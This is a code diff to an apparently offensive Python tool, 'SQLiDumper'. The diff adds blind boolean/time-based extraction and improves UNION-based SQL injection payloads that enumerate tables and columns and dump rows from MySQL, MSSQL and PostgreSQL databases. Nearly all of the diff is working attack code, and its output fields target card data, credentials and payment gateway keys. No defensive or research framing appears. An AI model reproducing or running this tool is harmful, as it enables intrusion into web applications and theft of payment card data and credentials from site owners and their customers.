@@ -24,6 +24,7 @@ from urllib.parse import urlencode
 from loguru import logger
 
 from sqli_scanner import SQLiResult, SQLiScanner
+from blind_dumper import BlindDumper, BlindDumpResult
 
 
 @dataclass
@@ -156,11 +157,23 @@ class SQLiDumper:
     }
 
     def __init__(self, scanner: SQLiScanner = None, output_dir: str = None,
-                 max_rows: int = 500, timeout: int = 20):
+                 max_rows: int = 500, timeout: int = 20,
+                 blind_enabled: bool = True, blind_time_delay: float = 3.0,
+                 blind_max_rows: int = 50):
         self.scanner = scanner or SQLiScanner(timeout=timeout)
         self.output_dir = output_dir or os.path.join(os.path.dirname(__file__), "dumps")
         self.max_rows = max_rows
         self.timeout = timeout
+        self.blind_enabled = blind_enabled
+        
+        # Initialize blind dumper
+        self.blind_dumper = BlindDumper(
+            scanner=self.scanner,
+            time_delay=blind_time_delay,
+            max_rows=blind_max_rows,
+            max_string_len=256,
+            timeout=timeout,
+        ) if blind_enabled else None
         
         os.makedirs(self.output_dir, exist_ok=True)
     
@@ -251,79 +264,100 @@ class SQLiDumper:
         base, params = scanner._parse_url(base_url)
         original = params[param][0] if isinstance(params[param], list) else params[param]
         
+        # Determine injection prefix: numeric vs string
+        prefix = "' "  # Default: string injection
+        if original.lstrip('-').isdigit():
+            prefix = " "  # Numeric — no quote needed
+        elif sqli.payload_used:
+            # Use scanner's detected payload to determine prefix
+            p = sqli.payload_used.strip()
+            if not p.startswith("'") and not p.startswith('"'):
+                prefix = " "
+        
         if sqli.injection_type == "union" and sqli.injectable_columns:
-            col_idx = sqli.injectable_columns[0]
             null_list = ["NULL"] * sqli.column_count
             
             if sqli.dbms in ("mysql", ""):
                 # MySQL: Extract from information_schema
-                marker_start = f"{random.randint(100000, 999999)}"
-                marker_end = f"{random.randint(100000, 999999)}"
+                marker_start_str = f"mds{random.randint(10000, 99999)}"
+                marker_end_str = f"mde{random.randint(10000, 99999)}"
+                marker_start_hex = marker_start_str.encode().hex()
+                marker_end_hex = marker_end_str.encode().hex()
                 
-                for offset in range(0, 200, 20):
+                # Try each injectable column until one reflects
+                for col_idx in sqli.injectable_columns:
+                    for offset in range(0, 200, 20):
+                        null_list_copy = null_list.copy()
+                        null_list_copy[col_idx] = (
+                            f"CONCAT(0x{marker_start_hex},"
+                            f"GROUP_CONCAT(table_name SEPARATOR 0x2c),"
+                            f"0x{marker_end_hex})"
+                        )
+                        
+                        query = (
+                            f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                            f"FROM information_schema.tables "
+                            f"WHERE table_schema=database() "
+                            f"LIMIT {offset},20-- -"
+                        )
+                        
+                        test_params = params.copy()
+                        test_params[param] = [f"{original}{query}"]
+                        test_url = scanner._build_url(base, test_params)
+                    
+                        body, _ = await scanner._fetch(test_url, session)
+                        if body:
+                            match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body)
+                            if match:
+                                found = match.group(1).split(",")
+                                tables.extend(found)
+                                if len(found) < 20:
+                                    break
+                            else:
+                                break
+                    # If we found tables with this column, stop trying others
+                    if tables:
+                        break
+            
+            elif sqli.dbms == "mssql":
+                for col_idx in sqli.injectable_columns:
                     null_list_copy = null_list.copy()
-                    null_list_copy[col_idx] = (
-                        f"CONCAT(0x{marker_start},"
-                        f"GROUP_CONCAT(table_name SEPARATOR 0x2c),"
-                        f"0x{marker_end})"
-                    )
-                    
+                    null_list_copy[col_idx] = "name"
                     query = (
-                        f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                        f"FROM information_schema.tables "
-                        f"WHERE table_schema=database() "
-                        f"LIMIT {offset},20-- -"
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM sysobjects WHERE xtype='U'-- -"
                     )
-                    
                     test_params = params.copy()
                     test_params[param] = [f"{original}{query}"]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
                     if body:
-                        match = re.search(rf'{marker_start}(.+?){marker_end}', body)
-                        if match:
-                            found = match.group(1).split(",")
-                            tables.extend(found)
-                            if len(found) < 20:
-                                break
-                        else:
-                            break
-            
-            elif sqli.dbms == "mssql":
-                null_list_copy = null_list.copy()
-                null_list_copy[col_idx] = "name"
-                query = (
-                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                    f"FROM sysobjects WHERE xtype='U'-- -"
-                )
-                test_params = params.copy()
-                test_params[param] = [f"{original}{query}"]
-                test_url = scanner._build_url(base, test_params)
-                
-                body, _ = await scanner._fetch(test_url, session)
-                if body:
-                    # Try to parse table names from response
-                    for t in re.findall(r'>\s*(\w+)\s*<', body):
-                        if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
-                            tables.append(t)
+                        for t in re.findall(r'>\s*(\w+)\s*<', body):
+                            if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
+                                tables.append(t)
+                    if tables:
+                        break
             
             elif sqli.dbms == "postgresql":
-                null_list_copy = null_list.copy()
-                null_list_copy[col_idx] = "tablename"
-                query = (
-                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                    f"FROM pg_tables WHERE schemaname='public'-- -"
-                )
-                test_params = params.copy()
-                test_params[param] = [f"{original}{query}"]
-                test_url = scanner._build_url(base, test_params)
-                
-                body, _ = await scanner._fetch(test_url, session)
-                if body:
-                    for t in re.findall(r'>\s*(\w+)\s*<', body):
-                        if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
-                            tables.append(t)
+                for col_idx in sqli.injectable_columns:
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = "tablename"
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM pg_tables WHERE schemaname='public'-- -"
+                    )
+                    test_params = params.copy()
+                    test_params[param] = [f"{original}{query}"]
+                    test_url = scanner._build_url(base, test_params)
+                    
+                    body, _ = await scanner._fetch(test_url, session)
+                    if body:
+                        for t in re.findall(r'>\s*(\w+)\s*<', body):
+                            if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
+                                tables.append(t)
+                    if tables:
+                        break
         
         # Deduplicate
         tables = list(dict.fromkeys(tables))
@@ -347,72 +381,91 @@ class SQLiDumper:
         base, params = scanner._parse_url(sqli.url)
         original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
         
+        # Determine injection prefix
+        prefix = "' "
+        if original.lstrip('-').isdigit():
+            prefix = " "
+        elif sqli.payload_used:
+            p = sqli.payload_used.strip()
+            if not p.startswith("'") and not p.startswith('"'):
+                prefix = " "
+        
         if sqli.injection_type == "union" and sqli.injectable_columns:
-            col_idx = sqli.injectable_columns[0]
             null_list = ["NULL"] * sqli.column_count
             
             if sqli.dbms in ("mysql", ""):
-                marker_start = f"{random.randint(100000, 999999)}"
-                marker_end = f"{random.randint(100000, 999999)}"
+                marker_start_str = f"mcs{random.randint(10000, 99999)}"
+                marker_end_str = f"mce{random.randint(10000, 99999)}"
+                marker_start_hex = marker_start_str.encode().hex()
+                marker_end_hex = marker_end_str.encode().hex()
                 
-                null_list_copy = null_list.copy()
-                null_list_copy[col_idx] = (
-                    f"CONCAT(0x{marker_start},"
-                    f"GROUP_CONCAT(column_name SEPARATOR 0x2c),"
-                    f"0x{marker_end})"
-                )
-                
-                query = (
-                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                    f"FROM information_schema.columns "
-                    f"WHERE table_schema=database() AND table_name='{table}'-- -"
-                )
-                
-                test_params = params.copy()
-                test_params[sqli.parameter] = [f"{original}{query}"]
-                test_url = scanner._build_url(base, test_params)
-                
-                body, _ = await scanner._fetch(test_url, session)
-                if body:
-                    match = re.search(rf'{marker_start}(.+?){marker_end}', body)
-                    if match:
-                        columns = match.group(1).split(",")
+                for col_idx in sqli.injectable_columns:
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = (
+                        f"CONCAT(0x{marker_start_hex},"
+                        f"GROUP_CONCAT(column_name SEPARATOR 0x2c),"
+                        f"0x{marker_end_hex})"
+                    )
+                    
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM information_schema.columns "
+                        f"WHERE table_schema=database() AND table_name='{table}'-- -"
+                    )
+                    
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_url = scanner._build_url(base, test_params)
+                    
+                    body, _ = await scanner._fetch(test_url, session)
+                    if body:
+                        match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body)
+                        if match:
+                            columns = match.group(1).split(",")
+                    if columns:
+                        break
             
             elif sqli.dbms == "mssql":
-                null_list_copy = null_list.copy()
-                null_list_copy[col_idx] = "column_name"
-                query = (
-                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                    f"FROM information_schema.columns "
-                    f"WHERE table_name='{table}'-- -"
-                )
-                test_params = params.copy()
-                test_params[sqli.parameter] = [f"{original}{query}"]
-                test_url = scanner._build_url(base, test_params)
-                
-                body, _ = await scanner._fetch(test_url, session)
-                if body:
-                    for c in re.findall(r'>\s*(\w+)\s*<', body):
-                        if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
-                            columns.append(c)
+                for col_idx in sqli.injectable_columns:
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = "column_name"
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM information_schema.columns "
+                        f"WHERE table_name='{table}'-- -"
+                    )
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_url = scanner._build_url(base, test_params)
+                    
+                    body, _ = await scanner._fetch(test_url, session)
+                    if body:
+                        for c in re.findall(r'>\s*(\w+)\s*<', body):
+                            if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
+                                columns.append(c)
+                    if columns:
+                        break
             
             elif sqli.dbms == "postgresql":
-                null_list_copy = null_list.copy()
-                null_list_copy[col_idx] = "column_name"
-                query = (
-                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                    f"FROM information_schema.columns "
-                    f"WHERE table_name='{table}'-- -"
-                )
-                test_params = params.copy()
-                test_params[sqli.parameter] = [f"{original}{query}"]
-                test_url = scanner._build_url(base, test_params)
-                
-                body, _ = await scanner._fetch(test_url, session)
-                if body:
-                    for c in re.findall(r'>\s*(\w+)\s*<', body):
-                        if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
-                            columns.append(c)
+                for col_idx in sqli.injectable_columns:
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = "column_name"
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM information_schema.columns "
+                        f"WHERE table_name='{table}'-- -"
+                    )
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_url = scanner._build_url(base, test_params)
+                    
+                    body, _ = await scanner._fetch(test_url, session)
+                    if body:
+                        for c in re.findall(r'>\s*(\w+)\s*<', body):
+                            if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
+                                columns.append(c)
+                    if columns:
+                        break
         
         columns = list(dict.fromkeys(columns))
         logger.info(f"Enumerated {len(columns)} columns from table '{table}'")
@@ -443,80 +496,98 @@ class SQLiDumper:
         if sqli.injection_type != "union" or not sqli.injectable_columns:
             return rows
         
-        col_idx = sqli.injectable_columns[0]
         null_list = ["NULL"] * sqli.column_count
+        
+        # Determine injection prefix
+        prefix = "' "
+        if original.lstrip('-').isdigit():
+            prefix = " "
+        elif sqli.payload_used:
+            p = sqli.payload_used.strip()
+            if not p.startswith("'") and not p.startswith('"'):
+                prefix = " "
         
         # Build CONCAT expression for all target columns
         separator = "0x7c7c"  # ||
         row_separator = "0x3c62723e"  # <br>
         
-        marker_start = f"{random.randint(100000, 999999)}"
-        marker_end = f"{random.randint(100000, 999999)}"
+        marker_start_str = f"mdd{random.randint(10000, 99999)}"
+        marker_end_str = f"mdx{random.randint(10000, 99999)}"
+        marker_start_hex = marker_start_str.encode().hex()
+        marker_end_hex = marker_end_str.encode().hex()
         
         if sqli.dbms in ("mysql", ""):
             concat_cols = ",".join([f"IFNULL({c},'NULL')" for c in columns])
             
-            for offset in range(0, limit, 20):
-                null_list_copy = null_list.copy()
-                null_list_copy[col_idx] = (
-                    f"CONCAT(0x{marker_start},"
-                    f"GROUP_CONCAT(CONCAT_WS({separator},{concat_cols}) SEPARATOR {row_separator}),"
-                    f"0x{marker_end})"
-                )
+            for col_idx in sqli.injectable_columns:
+                found_any = False
+                for offset in range(0, limit, 20):
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = (
+                        f"CONCAT(0x{marker_start_hex},"
+                        f"GROUP_CONCAT(CONCAT_WS({separator},{concat_cols}) SEPARATOR {row_separator}),"
+                        f"0x{marker_end_hex})"
+                    )
                 
-                query = (
-                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
-                    f"FROM {table} LIMIT {offset},20-- -"
-                )
-                
-                test_params = params.copy()
-                test_params[sqli.parameter] = [f"{original}{query}"]
-                test_url = scanner._build_url(base, test_params)
-                
-                body, _ = await scanner._fetch(test_url, session)
-                if not body:
-                    break
-                
-                match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
-                if not match:
-                    break
-                
-                raw_rows = match.group(1).split("<br>")
-                batch_count = 0
-                for raw_row in raw_rows:
-                    if not raw_row.strip():
-                        continue
-                    values = raw_row.split("||")
-                    if len(values) == len(columns):
-                        row = {columns[i]: values[i] for i in range(len(columns))}
-                        rows.append(row)
-                        batch_count += 1
-                
-                if batch_count < 20:
-                    break  # No more rows
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM {table} LIMIT {offset},20-- -"
+                    )
+                    
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_url = scanner._build_url(base, test_params)
+                    
+                    body, _ = await scanner._fetch(test_url, session)
+                    if not body:
+                        break
+                    
+                    match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
+                    if not match:
+                        break
+                    
+                    found_any = True
+                    raw_rows = match.group(1).split("<br>")
+                    batch_count = 0
+                    for raw_row in raw_rows:
+                        if not raw_row.strip():
+                            continue
+                        values = raw_row.split("||")
+                        if len(values) == len(columns):
+                            row = {columns[i]: values[i] for i in range(len(columns))}
+                            rows.append(row)
+                            batch_count += 1
+                    
+                    if batch_count < 20:
+                        break  # No more rows
+                if found_any:
+                    break  # Found rows with this column, stop trying others
         
         elif sqli.dbms == "mssql":
             # MSSQL: Use FOR XML PATH
             concat_cols = "+CHAR(124)+CHAR(124)+".join([f"ISNULL(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns])
             
-            null_list_copy = null_list.copy()
-            null_list_copy[col_idx] = (
-                f"STUFF((SELECT TOP {limit} CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
-                f"{concat_cols} FROM {table} FOR XML PATH('')),1,0,'')"
-            )
-            
-            query = f"' UNION ALL SELECT {','.join(null_list_copy)}-- -"
-            test_params = params.copy()
-            test_params[sqli.parameter] = [f"{original}{query}"]
-            test_url = scanner._build_url(base, test_params)
-            
-            body, _ = await scanner._fetch(test_url, session)
-            if body:
-                for raw_row in re.findall(r'<br>(.+?)(?=<br>|$)', body):
-                    values = raw_row.split("||")
-                    if len(values) == len(columns):
-                        row = {columns[i]: values[i] for i in range(len(columns))}
-                        rows.append(row)
+            for col_idx in sqli.injectable_columns:
+                null_list_copy = null_list.copy()
+                null_list_copy[col_idx] = (
+                    f"STUFF((SELECT TOP {limit} CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
+                    f"{concat_cols} FROM {table} FOR XML PATH('')),1,0,'')"
+                )
+                
+                query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}-- -"
+                test_params = params.copy()
+                test_params[sqli.parameter] = [f"{original}{query}"]
+                test_url = scanner._build_url(base, test_params)
+                
+                body, _ = await scanner._fetch(test_url, session)
+                if body:
+                    for raw_row in re.findall(r'<br>(.+?)(?=<br>|$)', body):
+                        values = raw_row.split("||")
+                        if len(values) == len(columns):
+                            row = {columns[i]: values[i] for i in range(len(columns))}
+                            rows.append(row)
+                if rows:
+                    break
         
         logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
         return rows
@@ -541,31 +612,42 @@ class SQLiDumper:
         base, params = scanner._parse_url(sqli.url)
         original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
         
-        col_idx = sqli.injectable_columns[0]
         null_list = ["NULL"] * sqli.column_count
+        
+        # Determine injection prefix
+        prefix = "' "
+        if original.lstrip('-').isdigit():
+            prefix = " "
+        elif sqli.payload_used:
+            p = sqli.payload_used.strip()
+            if not p.startswith("'") and not p.startswith('"'):
+                prefix = " "
         
         dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
         if not dios_query:
             return None
         
-        marker_start = f"{random.randint(100000, 999999)}"
-        marker_end = f"{random.randint(100000, 999999)}"
+        marker_start_str = f"dio{random.randint(10000, 99999)}"
+        marker_end_str = f"dix{random.randint(10000, 99999)}"
+        marker_start_hex = marker_start_str.encode().hex()
+        marker_end_hex = marker_end_str.encode().hex()
         
-        null_list_copy = null_list.copy()
-        null_list_copy[col_idx] = f"CONCAT(0x{marker_start},{dios_query},0x{marker_end})"
-        
-        query = f"' UNION ALL SELECT {','.join(null_list_copy)}-- -"
-        test_params = params.copy()
-        test_params[sqli.parameter] = [f"{original}{query}"]
-        test_url = scanner._build_url(base, test_params)
-        
-        body, _ = await scanner._fetch(test_url, session)
-        if body:
-            match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
-            if match:
-                raw = match.group(1)
-                logger.info(f"DIOS dump successful, {len(raw)} chars extracted")
-                return raw
+        for col_idx in sqli.injectable_columns:
+            null_list_copy = null_list.copy()
+            null_list_copy[col_idx] = f"CONCAT(0x{marker_start_hex},{dios_query},0x{marker_end_hex})"
+            
+            query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}-- -"
+            test_params = params.copy()
+            test_params[sqli.parameter] = [f"{original}{query}"]
+            test_url = scanner._build_url(base, test_params)
+            
+            body, _ = await scanner._fetch(test_url, session)
+            if body:
+                match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
+                if match:
+                    raw = match.group(1)
+                    logger.info(f"DIOS dump successful, {len(raw)} chars extracted")
+                    return raw
         
         return None
 
@@ -753,3 +835,64 @@ class SQLiDumper:
             saved["schema"] = filepath
         
         return saved
+
+    # ==================== BLIND DUMPING ====================
+
+    async def blind_targeted_dump(self, sqli: SQLiResult,
+                                   session: aiohttp.ClientSession,
+                                   progress_callback=None) -> DumpedData:
+        """Perform blind data extraction for boolean/time-based SQLi.
+        
+        Delegates to BlindDumper for char-by-char extraction, then converts
+        the result to DumpedData for pipeline compatibility.
+        
+        Args:
+            sqli: SQLiResult with boolean or time injection_type
+            session: aiohttp session
+            progress_callback: Optional async callback for progress updates
+            
+        Returns:
+            DumpedData with extracted findings (same format as targeted_dump)
+        """
+        if not self.blind_dumper:
+            logger.warning("Blind dumper not initialized")
+            return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
+        
+        if sqli.injection_type not in ("boolean", "time"):
+            logger.warning(f"blind_targeted_dump called with {sqli.injection_type}, skipping")
+            return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
+        
+        logger.info(f"Starting blind {sqli.injection_type} dump for {sqli.url}")
+        
+        blind_result = await self.blind_dumper.blind_dump(
+            sqli=sqli,
+            session=session,
+            progress_callback=progress_callback,
+        )
+        
+        # Convert BlindDumpResult → DumpedData for pipeline compat
+        return self._convert_blind_result(blind_result)
+
+    def _convert_blind_result(self, blind: BlindDumpResult) -> DumpedData:
+        """Convert BlindDumpResult to DumpedData for compatibility."""
+        dump = DumpedData(
+            url=blind.url,
+            dbms=blind.dbms,
+            database=blind.database,
+            tables=blind.tables,
+            data=blind.data,
+            card_data=blind.card_data,
+            credentials=blind.credentials,
+            gateway_keys=blind.gateway_keys,
+        )
+        
+        # Log stats
+        stats = blind.stats
+        logger.info(
+            f"Blind dump stats: {stats.requests_made} requests, "
+            f"{stats.chars_extracted} chars, {stats.tables_found} tables, "
+            f"{stats.rows_extracted} rows in {stats.elapsed:.0f}s "
+            f"({stats.requests_per_sec:.1f} req/s)"
+        )
+        
+        return dump
